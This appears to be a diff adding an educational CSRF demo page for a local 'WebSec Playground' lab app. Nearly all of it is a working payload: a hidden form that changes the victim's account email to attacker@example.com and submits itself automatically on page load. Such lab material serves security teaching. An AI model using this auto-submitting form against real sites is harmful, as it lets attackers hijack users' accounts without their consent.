@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>CSRF Demo</title>
+  </head>
+  <body>
+    <h1>CSRF Demo (Educational)</h1>
+    <p>
+      If you are logged into <code>WebSec Playground</code> in another tab,
+      this page can submit a request to <code>/settings</code> without your consent.
+    </p>
+
+    <p><strong>Target:</strong> http://127.0.0.1:5000/settings</p>
+    <p><strong>New email:</strong> attacker@example.com</p>
+
+    <!-- Intentionally malicious form -->
+    <form id="csrfForm" action="http://127.0.0.1:5000/settings" method="POST">
+      <input type="hidden" name="email" value="attacker@example.com" />
+      <button type="submit">Submit CSRF</button>
+    </form>
+
+    <script>
+      // Auto-submit to simulate a drive-by attack
+      setTimeout(() => {
+        document.getElementById("csrfForm").submit();
+      }, 800);
+    </script>
+  </body>
+</html>
